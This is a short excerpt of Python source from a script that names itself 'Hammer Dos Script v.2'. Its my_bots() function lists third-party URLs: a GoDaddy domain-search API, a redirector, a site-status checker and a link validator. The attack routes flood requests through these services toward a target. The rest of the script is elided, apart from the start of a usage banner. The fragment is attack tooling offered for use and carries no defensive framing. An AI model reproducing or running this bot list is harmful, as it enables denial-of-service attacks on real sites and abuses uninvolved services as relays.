...
def my_bots():
    ...
    bots.append("https://entourage.prod.aws.godaddy.com/domainsapi/v1/search/spins?&q=")
    bots.append("https://eshik.org/b/http://")
    bots.append("https://downforeveryoneorjustme.com/")
    bots.append("http://outdoorgearchoices.com/__media__/js/netsoltrademark.php?d=validator.w3.org/checklink?uri=")
	return(bots)
...
def usage():
	print (''' \033[92m	Hammer Dos Script v.2 Anon Mug0
